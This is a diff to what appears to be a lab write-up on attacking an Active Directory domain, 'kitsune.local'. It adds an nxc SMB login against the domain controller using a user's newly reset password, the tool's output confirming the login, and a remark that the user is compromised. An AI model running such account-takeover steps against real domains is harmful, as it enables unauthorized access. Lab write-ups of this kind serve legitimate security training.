@@ -350,7 +350,13 @@ I now have a TGT for the user, this TGT should contain the SID of the helpdesk g
 Ill then just change the password of the user like bloodhound said i could do
 
 ```python
-
+❯❯❯ nxc smb dc01.kitsune.local -u 'schlop' -p 'Password123!' --smb-timeout 4
+SMB         10.1.176.128    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.176.128    445    DC01             [+] kitsune.local\schlop:Password123! 
 ```
+
+This user is now compromised!
+
+
 
 
